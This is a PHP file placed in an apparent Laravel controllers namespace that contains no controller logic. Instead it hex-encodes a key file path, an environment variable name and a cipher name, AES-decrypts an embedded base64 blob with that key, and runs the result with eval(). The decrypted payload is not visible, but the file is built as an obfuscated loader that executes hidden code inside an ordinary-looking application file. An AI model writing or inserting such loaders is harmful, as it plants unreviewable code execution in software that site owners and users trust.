<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lpMOD4w6O4R9JahoIPjqFg==');

$c=base64_decode(

'vOC5zwkwwdSPF83H4/4SIOiibHBhGzirOaFIaTFGegXg4iDfw+Hm9627UletuHf98Io5FKSu50y7' .
'uN2F6ObNPfIxhtIQNM3nRwGXF44QVhwT+MdSQ4cps8REzwLUmr0BCEHmK9CzDsK/Gf6dZmy/coMv' .
'aq39T4cfUOj6VgMBBHb/3Dz2HzIE5mCIzR5YXon5bMTfLnsNbx7C1XK+PHcn7VW8f8TmOhfDjzr/' .
's+S7m8WkvEiuHFgOVyKLEJCvAfYWS4WLgoEaQXMyK4D07FV1dPkZzOfgbINyMx2HijGgErCxcTl6' .
'lrMDWO9ZiyKd/zyApwAded7r8+KwG1UYQw3xJHm/hwx5ypZ2AECVDyh2L2rTgBICuQ/n43GSAb7f' .
'QzGNgs9e/AWBoXIUHehz12TgAA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

